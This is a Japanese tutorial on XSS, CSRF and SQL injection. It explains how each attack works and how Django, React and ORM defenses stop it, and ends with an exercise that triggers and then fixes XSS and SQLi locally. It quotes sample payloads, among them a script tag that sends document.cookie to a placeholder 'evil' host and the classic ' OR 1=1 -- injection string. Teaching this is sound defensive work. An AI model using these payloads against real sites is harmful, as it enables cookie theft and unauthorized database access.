---
id: sec-01
title: Web の 3 大脆弱性 (XSS / CSRF / SQL インジェクション)
summary: 何が起きるのか、なぜ防げるのかを仕組みで理解する。フレームワークが守ってくれる範囲と、自分で壊してしまう書き方
minutes: 14
---
## 共通する構造

3 つとも「**データとして扱うべき入力を、命令として解釈させてしまう**」ことで起きます。

| 脆弱性 | 入力が命令になる場所 | 対策の本質 |
|---|---|---|
| XSS | ブラウザの HTML / JS | 出力時にエスケープ |
| SQL インジェクション | DB の SQL | 値を SQL に混ぜない (プレースホルダ) |
| CSRF | (別サイトからの) 正規リクエスト | リクエストが自サイト発だと証明する (トークン) |

## XSS: 入力が HTML になる

掲示板に `<script>fetch("https://evil/?c=" + document.cookie)</script>` と投稿し、それがそのまま HTML として表示されると、見た人全員のブラウザでこの JS が動きます。

```javascript
el.innerHTML = comment;        // NG: comment に HTML が含まれると実行される
el.textContent = comment;      // OK: 文字として表示される
```

```django
{{ comment }}                  {# Django テンプレートは自動エスケープ #}
{{ comment|safe }}             {# safe を付けた瞬間に無防備になる #}
```

React の `{comment}` も自動エスケープです。`dangerouslySetInnerHTML` は名前の通りです。

**防ぐ側の原則**: 表示するときにエスケープする。入力時に削るのではなく、出力時に変換します。加えて、Cookie に `HttpOnly` を付けると JS から読めなくなり、盗まれても被害が減ります。

## SQL インジェクション: 入力が SQL になる

```python
name = request.GET["name"]                                  # "' OR 1=1 --"
cursor.execute(f"SELECT * FROM users WHERE name = '{name}'")  # 全件返る / 任意の SQL
```

対策は **値を SQL 文字列に混ぜない** こと。

```python
cursor.execute("SELECT * FROM users WHERE name = %s", [name])   # プレースホルダ
User.objects.filter(name=name)                                  # ORM も内部でこれ
db.execute(select(User).where(User.name == name))
```

ORM を使っていれば普段は安全ですが、`raw()` / `text()` で SQL を自分で書く場面では責任が戻ってきます。列名や `ORDER BY` の向きのように値渡しできない部分は、`if column in ALLOWED:` の許可リストで検証します。

## CSRF: 本人のブラウザに勝手に送らせる

1. ユーザーが自サイトにログイン中 (Cookie にセッションがある)
2. 罠サイトを開く。そこに `<form action="https://自サイト/transfer" method="post">` と自動送信の JS
3. ブラウザは自サイトへのリクエストなので **Cookie を自動で付ける**
4. サーバーは正規のログイン済みリクエストと区別できず、送金が通る

対策は「このリクエストは自サイトのページから送られた」と証明するトークンです。サーバーがページに埋め込んだ乱数 (`{% csrf_token %}`) を POST に含め、一致しなければ拒否します。罠サイトはこの値を知りません。

```javascript
// fetch から送る場合
fetch("/api/transfer", {
  method: "POST",
  headers: { "X-CSRFToken": getCookie("csrftoken"), "Content-Type": "application/json" },
  body: JSON.stringify(payload),
});
```

Cookie の `SameSite=Lax` (現代のブラウザの既定) は他サイトからの POST に Cookie を付けなくなり、大きな緩和になります。それでもトークンは残します。多層防御です。

**JWT を Authorization ヘッダーで送る API** は、ブラウザが自動で付けるものが無いので CSRF の影響を受けません。代わりに XSS でトークンを盗まれると終わりなので、XSS 対策の重要度が上がります。

## フレームワークが守る範囲

| 対策 | Django | FastAPI |
|---|---|---|
| XSS | テンプレート自動エスケープ | (JSON API なのでフロント側の責任) |
| SQLi | ORM | SQLAlchemy |
| CSRF | CsrfViewMiddleware + `{% csrf_token %}` | 無し (ヘッダー認証なら不要) |

「フレームワークが守ってくれる」のは、その仕組みを **迂回しなかったとき** だけです。`|safe`、`innerHTML`、`raw()`、`@csrf_exempt` はすべて迂回スイッチです。使うときは理由をコメントに残します。

## まとめ

- 入力を命令にしない。出力でエスケープ、SQL は値渡し、POST はトークン
- ORM とテンプレートを素直に使っていれば大半は守られる
- 迂回スイッチ (`safe` / `innerHTML` / `raw` / `csrf_exempt`) は理由付きで
- Cookie は `HttpOnly` + `SameSite`、それでもトークンは残す

## やってみる

**ゴール:** XSS と SQL インジェクションを自分で起こして、自分で塞ぐ。

1. XSS: `xss.html` に `<div id="o"></div><script>document.querySelector("#o").innerHTML = location.hash.slice(1)</script>`。ブラウザで `xss.html#<img src=x onerror=alert(1)>` を開く。`innerHTML` を `textContent` に変えて再度開く
2. SQLi: `python3`
   ```python
   import sqlite3; c = sqlite3.connect(":memory:")
   c.execute("create table u(name)"); c.execute("insert into u values('a'),('b')")
   name = "' OR 1=1 --"
   c.execute(f"select * from u where name = '{name}'").fetchall()
   c.execute("select * from u where name = ?", [name]).fetchall()
   ```

**確認:** alert が出た → 出なくなった。全件返った → 0 件になった。
